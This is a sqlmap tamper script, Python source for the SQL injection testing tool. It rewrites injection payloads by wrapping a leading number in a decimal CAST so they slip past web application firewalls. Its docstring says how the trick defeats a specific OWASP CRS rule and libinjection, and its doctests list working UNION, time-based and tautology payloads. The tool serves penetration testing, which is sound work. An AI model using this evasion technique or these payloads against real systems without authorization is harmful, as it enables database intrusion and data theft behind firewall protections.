#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Wraps a leading numeric value into a CAST() call (e.g. -1 UNION ... -> cast(-1 as decimal) UNION ...)

    Requirement:
        * MySQL
        * MariaDB
        * PostgreSQL
        * Microsoft SQL Server

    Tested against:
        * MySQL 5.5.62, 5.7.44, 8.0.36, 8.0.46, 8.4.9, 9.4.0
        * Percona 8.0.46
        * MariaDB 10.7.8, 10.11.14, 11.4.12, 11.8.8, 12.0.2
        * PostgreSQL 13.23, 17.11
        * Microsoft SQL Server 2022

    Notes:
        * Useful to bypass web application firewalls, verified against ModSecurity v3 with the
          OWASP CRS (paranoia level 1, blocking mode), where it takes the tautology,
          boolean-based, error-based and time-based payloads to 0 anomaly points and they are
          answered with HTTP 200
        * The OWASP CRS rule 942360 is anchored with '^[\\W\\d]+\\s*?<keyword>', so it can only
          match when the payload starts with non-word characters or digits. Starting it with a
          letter instead makes the rule fail at the first position
        * Rated benign by libinjection 4.0.0 as well, which is CRS rule 942100
        * 'decimal' is used as the target type because it is the one spelling accepted by all
          of MySQL, MariaDB, PostgreSQL and Microsoft SQL Server ('signed' is MySQL only,
          'int' is rejected by MySQL), while the numeric value itself is left unchanged
        * For MySQL only, tamper script 'odbcbrace' achieves the same with a shorter prefix

    >>> tamper('-1 UNION ALL SELECT NULL,NULL-- -')
    'cast(-1 as decimal) UNION ALL SELECT NULL,NULL-- -'
    >>> tamper('1 AND SLEEP(5)')
    'cast(1 as decimal) AND SLEEP(5)'
    >>> tamper('-4162 OR 1=1#')
    'cast(-4162 as decimal) OR 1=1#'
    >>> tamper("' OR 1=1-- -")
    "' OR 1=1-- -"
    """

    return re.sub(r"\A(?P<num>[+-]?\d+)(?![\w.])", r"cast(\g<num> as decimal)", payload) if payload else payload
